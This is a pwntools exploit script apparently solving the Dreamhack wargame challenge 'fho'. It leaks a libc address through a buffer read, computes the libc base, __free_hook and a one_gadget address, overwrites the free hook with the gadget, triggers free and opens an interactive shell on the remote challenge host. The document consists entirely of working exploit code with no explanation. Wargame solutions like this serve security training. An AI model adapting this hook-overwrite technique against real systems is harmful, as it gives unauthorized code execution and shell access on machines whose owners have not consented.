from pwn import *

p = remote('host3.dreamhack.games', 14026)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

buf = b'A' * 0x48
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00' * 2)

lb = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
free_hook = lb + libc.symbols['__free_hook']
one_gadget = lb + 0x4f432

p.sendlineafter(b'To write: ', str(free_hook).encode())
p.sendlineafter(b'With: ', str(one_gadget).encode()) # one_gadget 이용
p.sendlineafter(b'To free: ', str(0).encode())

p.interactive()